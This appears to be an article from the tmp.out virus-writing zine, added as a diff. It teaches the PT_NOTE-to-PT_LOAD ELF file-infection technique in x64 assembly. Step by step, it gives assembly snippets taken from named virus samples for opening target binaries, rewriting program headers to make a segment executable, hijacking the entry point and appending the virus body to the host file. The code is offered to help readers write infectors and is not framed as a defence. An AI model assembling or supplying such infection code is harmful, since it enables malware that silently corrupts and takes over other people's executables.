@@ -1,0 +1,389 @@
+                                                            ┌───────────────────────┐
+                                                            ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                            │ █   █ █ █ █   █       │
+                                                            │ █   █ █ █ █▀▀▀▀       │
+                                                            │ █   █   █ █     ▄     │
+                                                            │                 ▄▄▄▄▄ │
+                                                            │                 █   █ │
+                                                            │                 █   █ │
+                                                            │                 █▄▄▄█ │
+                                                            │                 ▄   ▄ │
+                                                            │                 █   █ │
+                                                            │                 █   █ │
+                                                            │                 █▄▄▄█ │
+                                                            │                 ▄▄▄▄▄ │
+                                                            │                   █   │
+Implementing the PT_NOTE Infection Method in x64 Assembly   │                   █   │
+~ sblip and the tmp.out crew                                └───────────────────█ ──┘
+
+In this first issue of tmp.out, we have supplied several examples of the
+PT_NOTE->PT_LOAD infection algorithm, three in x64 asm and one in Rust. 
+For those learning the craft I thought it useful to address implementing some of the 
+specific steps in x64 assembly. In March 2019 while working on a golang rewrite of 
+the backdoorfactory, I wrote a breakdown of implementing the algorithm in golang at 
+the link below, for those interested in doing fun ELF things in golang:
+
+  https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/
+
+The algorithm for x64 is of course the same, however I will provide some code 
+snippets below that I hope will be of help for the aspiring x64 assembly ELF 
+programmer. 
+
+We can use the same steps listed in the above article as a reference, though the
+order things are done in may change based on the implementation. Some methods write 
+a new file to disk and then copy over it, while others write to the file directly.
+
+From the above link, a generic list of steps to implement the PT_NOTE->PT_LOAD 
+infection algorithm:
+
+  1. Open the ELF file to be injected
+  2. Save the original entry point, e_entry
+  3. Parse the program header table, looking for a PT_NOTE segment
+  4. Convert the PT_NOTE segment to a PT_LOAD segment
+  5. Change the memory protections for this segment to allow executable instructions
+  6. Change the entry point address to an area that will not conflict with the 
+     original program execution.
+  7. Adjust the size on disk and virtual memory size to account for the size of the 
+     injected code
+  8. Point the offset of our converted segment to the end of the original binary, 
+     where we will store the new code
+  9. Patch the end of the code with instructions to jump to the original entry point
+ 10. Add our injected code to the end of the file
+*11. Write the file back to disk, over the original file* -- we will not cover this 
+     implementation variant here, which creates	a new temporary ELF binary on disk 
+     and overwrites the host, as referenced above.
+
+We will loosely follow the above steps, however the reader should keep in mind that 
+some of them may be performed out of order (and some cannot be performed until others
+have) - but in the end all the steps must be taken.
+
+1. Open the ELF file to be injected:
+
+The syscall getdents64() syscall is how we find files on 64 bit systems. The function
+is defined as:
+
+  int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+
+We will leave implementing getdents64() as an exercise for the reader - There are 
+several examples of it in the code distributed with this publication, including in 
+Midrashim, kropotkin, Eng3ls, and Bak0unin.
+
+For the ELF historians, I wrote a terrible (and now entirely outdated) article 20 
+years ago about doing this in 32-bit AT&T syntax, located here:
+
+  https://tmpout.sh/papers/getdents.old.att.syntax.txt
+
+Assuming we have called getdents64() and stored the directory entry struct on the 
+stack, we can see from looking at it:
+
+  struct linux_dirent {
+      unsigned long  d_ino;     /* Inode number */
+      unsigned long  d_off;     /* Offset to next linux_dirent */
+      unsigned short d_reclen;  /* Length of this linux_dirent */
+      char           d_name[];  /* Filename (null-terminated) */
+                        /* length is actually (d_reclen - 2 -
+                           offsetof(struct linux_dirent, d_name)) */
+      /*
+      char           pad;       // Zero padding byte
+      char           d_type;    // File type (only since Linux
+                                // 2.6.4); offset is (d_reclen - 1)
+      */
+  }
+
+that the null terminated file name d_name is at the offset [rsp+18] or [rsp+0x12]
+
+  d_ino is bytes 0-7              - unsigned long
+  d_off is bytes 8-15             - unsigned long
+  d_reclen is bytes 16-17         - unsigned short
+  d_name starts on the 18th byte. - null terminated file name
+
+for our call to open(), int open(const char *pathname, int flags, mode_t mode);
+
+  - rax will hold the syscall number, 2
+  - rdi will hold the file name d_name, in our case [rsp+18]
+  - rsi will hold the flags, which could either be O_RDONLY (0) or O_RDWR (02), 
+    depending on how our vx works
+  - rdx would hold the mode, but we do not need this and will zero it out.
+
+So the following code:
+
+  mov rax, 2         ; open syscall
+  mov rdi, [rsp+18]  ; d_name from the dirent struct that starts at the beginning 
+                     ; of the stack
+  mov rsi, 2         ; O_RDWR / Read and Write
+  syscall
+
+will return a file descriptor in rax if successful. If 0 or negative, an error has
+occurred opening the file.
+
+  cmp rax, 0
+  jng file_open_error
+
+or
+  test rax, rax
+  js file_open_error
+
+2. Save the original entry point, e_entry:
+
+In TMZ's Midrashim, he stores the original entry point in the r14 register for later
+use, which he has copied onto the stack. The high registers r13, r14, and r15 are 
+good places to store data/addresses for later use, as they are not clobbered by 
+syscalls.
+
+  ; Stack buffer:
+  ; r15 + 0 = stack buffer (10000 bytes) = stat
+  ; r15 + 48 = stat.st_size
+  ; r15 + 144 = ehdr
+  ; r15 + 148 = ehdr.class
+  ; r15 + 152 = ehdr.pad
+  ; r15 + 168 = ehdr.entry
+  ---cut---
+  
+  mov r14, [r15 + 168]  ; storing target original ehdr.entry from [r15 + 168] in r14
+
+3. Parse the program header table, looking for the PT_NOTE segment:
+
+As you probably intuited from the name of this article, our goal is to convert a 
+PT_NOTE segment into a loadable PT_LOAD segment, with rx (or rwx) permissions.
+I would be remiss not to mention that this algorithm does not work 
+"cookie-cutter-out-of-the box" for some binaries such as golang binaries, and any
+binaries compiled with the -fcf-protection flag, without even more magical fuckery
+that we haven't done (or seen) yet. Next zine content, Every0ne? 
+
+Aside from the edge cases, the basic concept is simple - PT_LOAD segments are 
+actually loaded into memory when an ELF binary is run - PT_NOTE segments are not.
+However, if we change a PT_NOTE section to type PT_LOAD, and change the memory 
+permissions to at least read and execute, we can put code that WE want to run there,
+write our data to the end of the original file, and change the associated Program 
+Header Table entry variables to facilitate loading it correctly.
+
+We put a value in the virtual address field v_addr that is very high in memory, which
+won't interfere with normal program execution. We then patch the original entry point
+to jump to our new PT_LOAD segment code first, which does whatever it does, and then 
+calls the original program code.
+
+A 64-bit ELF Program Header Table entry has the following structure:
+
+  typedef struct {
+      uint32_t   p_type;   // 4 bytes
+      uint32_t   p_flags;  // 4 bytes
+      Elf64_Off  p_offset; // 8 bytes
+      Elf64_Addr p_vaddr;  // 8 bytes
+      Elf64_Addr p_paddr;  // 8 bytes
+      uint64_t   p_filesz; // 8 bytes
+      uint64_t   p_memsz;  // 8 bytes
+      uint64_t   p_align;  // 8 bytes
+  } Elf64_Phdr;
+
+
+In this code snippet from kropotkin.s, we cycle through each program header table 
+entry by loading the offset of the PHT into rbx, the number of PHT entries into ecx,
+and reading the first 4 bytes at the beginning of the entry looking for a value of 4,
+which is the number designated for segments of type PT_NOTE.  
+
+parse_phdr:
+  xor rcx, rcx                       ; zero out rcx
+  xor rdx, rdx                       ; zero out rdx
+  mov cx, word [rax+e_hdr.phnum]     ; rcx contains the number of entries in the PHT
+  mov rbx, qword [rax+e_hdr.phoff]   ; rbx contains the offset of the PHT
+  mov dx, word [rax+e_hdr.phentsize] ; rdx contains the size of an entry in the PHT
+
+  loop_phdr:
+      add rbx, rdx                   ; for every iteration, add size of a PHT entry
+      dec rcx                        ; decrease phnum until we've iterated through 
+                                     ; all program headers or found a PT_NOTE segment
+      cmp dword [rax+rbx+e_phdr.type], 0x4  ; if 4, we have found a PT_NOTE segment,
+                                            ; and head off to infect it
+      je pt_note_found
+      cmp rcx, 0
+      jg loop_phdr
+      ...
+      ...
+  pt_note_found:
+
+4. Convert the PT_NOTE segment to a PT_LOAD segment:
+
+To convert a PT_NOTE segment into a PT_LOAD segment, we must change a few values in
+the Program Header Table entry that describes the segment.
+
+Note that 32-bit ELF binaries have a different PHT entry structure, with the p_flags
+value as the 7th entry in the struct, as opposed to being the 2nd entry in its 64-bit
+counterpart.
+
+  typedef struct {
+      uint32_t   p_type;  <-- Change this value to PT_LOAD == 1
+      uint32_t   p_flags; <-- Change to at least Read+Execute permissions
+      Elf64_Off  p_offset;
+      Elf64_Addr p_vaddr; <-- very high virtual addr where the segment will be loaded
+      Elf64_Addr p_paddr;
+      uint64_t   p_filesz;
+      uint64_t   p_memsz;
+      uint64_t   p_align;
+  } Elf64_Phdr;
+
+First, the p_type must be changed from PT_NOTE, which is 4, to PT_LOAD, which is 1.
+
+Second, the p_flags must be changed to, at the very least, allow Read and Execute 
+access. This is a standard bitmask just like unix file permissions, with
+
+  PF_X == 1
+  PF_W == 2
+  PF_R == 4
+
+In fasm syntax, as seen below, this is done simply by typing "PF_R or PF_X"
+
+Third, we need to choose an address for the new virus data to be loaded. A common 
+technique is to pick a very high address, 0xc000000, that is unlikely to overlap 
+with an existing segment. We add this to the stat.st_size file size, which in the
+below case has been retrieved from r15+48 and stored in r13, to which we then add
+0xc000000. We then store this value in p_vaddr.
+
+From TMZ's Midrashim:
+
+  .patch_phdr:
+    mov dword [r15 + 208], PT_LOAD              ; change phdr type in [r15 + 208] 
+                                                ;  from PT_NOTE to PT_LOAD (1)
+    mov dword [r15 + 212], PF_R or PF_X         ; change phdr.flags in [r15 + 212] 
+                                                ;  to PF_X (1) | PF_R (4)
+    pop rax                                     ; restore target EOF offset into rax
+    mov [r15 + 216], rax                        ; phdr.offset [r15 + 216] = target 
+                                                ;  EOF offset
+    mov r13, [r15 + 48]                         ; storing target stat.st_size from 
+                                                ;  [r15 + 48] in r13
+    add r13, 0xc000000                          ; add 0xc000000 to target file size
+    mov [r15 + 224], r13                        ; changing phdr.vaddr in [r15 + 224]
+                                                ;  to new one in r13 
+                                                ;  (stat.st_size + 0xc000000)
+    mov qword [r15 + 256], 0x200000             ; set phdr.align [r15 + 256] to 2mb
+    add qword [r15 + 240], v_stop - v_start + 5 ; add virus size to phdr.filesz in 
+                                                ;  [r15 + 240] + 5 for the jmp to 
+                                                ;  original ehdr.entry
+    add qword [r15 + 248], v_stop - v_start + 5 ; add virus size to phdr.memsz in 
+                                                ;  [r15 + 248] + 5 for the jmp to 
+                                                ;  original ehdr.entry
+
+5. Change the memory protections for this segment to allow executable instructions:
+
+    mov dword [r15 + 212], PF_R or PF_X         ; change phdr.flags in [r15 + 212] 
+                                                ;  to PF_X (1) | PF_R (4)
+
+6. Change the entry point address to an area that will not conflict with the original
+   program execution. We'll use 0xc000000. Pick an address that will be sufficiently
+   high enough in virtual memory that when loaded it does not overlap other code.
+
+    mov r13, [r15 + 48]     ; storing target stat.st_size from [r15 + 48] in r13
+    add r13, 0xc000000      ; adding 0xc000000 to target file size
+    mov [r15 + 224], r13    ; changing phdr.vaddr in [r15 + 224] to new one in r13 
+                            ;  (stat.st_size + 0xc000000)
+
+7. Adjust the size on disk and virtual memory size to account for the size of the 
+   injected code
+
+    add qword [r15 + 240], v_stop - v_start + 5  ; add virus size to phdr.filesz in
+                                                 ;  [r15 + 240] + 5 for the jmp to 
+                                                 ;  original ehdr.entry
+    add qword [r15 + 248], v_stop - v_start + 5  ; add virus size to phdr.memsz in
+                                                 ;  [r15 + 248] + 5 for the jmp to
+                                                 ;  original ehdr.entry
+
+8. Point the offset of our converted segment to the end of the original binary, 
+   where we will store the new code:
+
+   Previously in Midrashim, this code was executed:
+    
+    mov rdx, SEEK_END
+    mov rax, SYS_LSEEK
+    syscall                ; getting target EOF offset in rax
+    push rax               ; saving target EOF
+
+   In .patch_phdr, we use this value as the location for storing our new code:
+
+    pop rax                ; restoring target EOF offset into rax
+    mov [r15 + 216], rax   ; phdr.offset [r15 + 216] = target EOF offset
+
+
+9. Patch the end of the code with instructions to jump to the original entry point:
+
+   Example #1, from Midrashim, using algorithm from Binjection:
+
+    .write_patched_jmp:
+      ; getting target new EOF
+      mov rdi, r9            ; r9 contains fd
+      mov rsi, 0             ; seek offset 0
+      mov rdx, SEEK_END      ; start at the end of the file
+      mov rax, SYS_LSEEK     ; lseek syscall
+      syscall                ; getting target EOF offset in rax
+
+      ; creating patched jmp
+      mov rdx, [r15 + 224]         ; rdx = phdr.vaddr
+      add rdx, 5                   ; the size of a jmp instruction
+      sub r14, rdx                 ; subtract the size of the jump from our stored
+                                   ;  e_entry from step #2 (saving e_entry)
+      sub r14, v_stop - v_start    ; subtract the size of the virus code itself
+      mov byte [r15 + 300 ], 0xe9  ; first byte of the jump instructions
+      mov dword [r15 + 301], r14d  ; new address to jump to, updated by subtracting
+                                 ;  virus size and size of jmp instruction
+
+   Example #2, from sblip/s01den vx's, using elfmaster's EOP technique:
+
+    Explaining this method is beyond the scope of this document - for reference:
+
+      https://n0.lol/TMPOUT_VOL1_DRAFT/11.html
+
+   The code from kropotkin.s:
+   
+       mov rcx, r15                    ; saved rsp
+       add rcx, VXSIZE
+       mov dword [rcx], 0xffffeee8     ; relative call to get_eip
+       mov dword [rcx+4], 0x0d2d48ff   ; sub rax, (VXSIZE+5)
+       mov byte  [rcx+8], 0x00000005 
+       mov word  [rcx+11], 0x0002d48
+       mov qword [rcx+13], r9          ; sub rax, entry0  
+       mov word  [rcx+17], 0x0000548
+       mov qword [rcx+19], r12         ; add rax, sym._start
+       mov dword [rcx+23], 0xfff4894c  ; movabs rsp, r14
+       mov word  [rcx+27], 0x00e0      ; jmp rax
+
+10. Add our injected code to the end of the file:
+
+From Midrashim:
+
+  We are adding our code directly to the end of the file, and pointing the new 
+  PT_LOAD address at it.  First we seek to the end of the file using the lseek
+  syscall to go to the end of the file whose file descriptor is held in the 
+  register r9. Calling .delta pushes the address of the next instruction on to
+  the top of the stack, in this case 'pop rbp'. Popping this instruction and 
+  then subtracting .delta will give you the memory address of the virus during 
+  runtime, which is used when reading/copying the virus code below where you 
+  see 'lea rsi, [rbp + v_start]' - providing a starting location for reading 
+  bytes to be written, with the number of bytes to be written is put in rdx 
+  before the call to pwrite64().
+
+  .append_virus:
+    ; getting target EOF
+    mov rdi, r9               ; r9 contains fd
+    mov rsi, 0                ; seek offset 0
+    mov rdx, SEEK_END         ; start at the end of the file
+    mov rax, SYS_LSEEK        ; lseek syscall
+    syscall                   ; getting target EOF offset in rax
+    push rax                  ; saving target EOF
+
+    call .delta               ; the age old trick
+    .delta:
+        pop rbp
+        sub rbp, .delta
+
+    ; writing virus body to EOF
+    mov rdi, r9               ; r9 contains fd
+    lea rsi, [rbp + v_start]  ; loading v_start address in rsi
+    mov rdx, v_stop - v_start ; virus size
+    mov r10, rax              ; rax contains target EOF offset from previous syscall
+    mov rax, SYS_PWRITE64     ; syscall #18, pwrite()
+    syscall
+
+The PT_NOTE infection algorithm has the benefit of being fairly easy to learn, as
+well as being very versatile. It can be combined with other techniques and any manner
+of data may be stored in a converted PT_LOAD segment, including symbol tables, raw 
+data, code for a DT_NEEDED object, or even an entirely separate ELF binary. I hope 
+this article proves useful to anyone learning x64 assembly language for the purposes
+of playing with ELF binaries.
